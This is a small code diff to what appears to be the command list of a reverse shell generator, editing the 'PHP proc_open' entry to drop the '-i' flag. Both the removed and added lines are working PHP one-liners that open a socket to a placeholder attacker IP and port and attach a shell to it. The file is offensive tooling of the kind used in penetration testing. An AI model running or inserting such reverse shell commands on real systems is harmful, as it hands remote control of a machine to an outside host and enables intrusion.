@@ -151,7 +151,7 @@ const reverseShellCommands = withCommandType(
         },
         {
             "name": "PHP proc_open",
-            "command": "php -r '$sock=fsockopen(\"{ip}\",{port});$proc=proc_open(\"{shell} -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'",
+            "command": "php -r '$sock=fsockopen(\"{ip}\",{port});$proc=proc_open(\"{shell}\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'",
             "meta": ["linux", "windows", "mac"]
         },
         {
